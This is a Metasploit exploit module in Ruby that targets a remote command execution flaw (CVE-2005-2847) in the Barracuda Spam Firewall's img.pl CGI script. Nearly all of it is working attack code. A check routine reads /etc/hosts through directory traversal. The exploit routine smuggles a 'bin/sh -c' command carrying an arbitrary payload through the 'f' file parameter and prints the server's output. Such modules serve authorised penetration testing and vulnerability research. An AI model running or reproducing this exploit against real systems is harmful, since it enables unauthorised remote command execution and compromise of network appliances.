require 'msf/core'

module Msf

class Exploits::Unix::Webapp::Barracuda_Image_Execution < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Barracuda IMG.PL Remote Command Execution',
			'Description'    => %q{
				This module exploits an arbitrary command execution vulnerability in the
				Barracuda Spam Firewall appliance. Versions prior to  3.1.18 are vulnerable.			
			},
			'Authors'        => [ 'Nicolas Gregoire <ngregoire[at]exaprobe.com>', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3509 $',
			'References'     =>
				[
					['URL', 'http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1'],
					['CVE', '2005-2847'],
					['OSVDB', '19279'],
					['BID', '14712'],
					['NSS', '19556'],
					['MIL', '99'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 4000,
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Sep 01 2005',
			'DefaultTarget' => 0))
			
			register_options(
				[
					OptString.new('URI', [true, "The full URI path to img.pl", "/cgi-bin/img.pl"]),
				], self.class)
	end

	def check
		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'vars_get' => 
			{
				'f' => ("../" * 8) + "etc/hosts"
			}
		}, 25)
		
		res.match(/localhost/) ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
	end
		
	def exploit
		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'vars_get' => 
			{
				'f' => ("../" * 8) + %Q!bin/sh -c "echo 'YYY'; #{payload.encoded}; echo 'YYY'"|!
			}
		}, 25)
		
		if (res)
			print_status("The server returned: #{res.code}")
			print("")
			
			m = res.match(/YYY(.*)YYY/)
			print(m[1]) if m
		else
			print_status("No response from the server")
		end
	end
	
end
end	
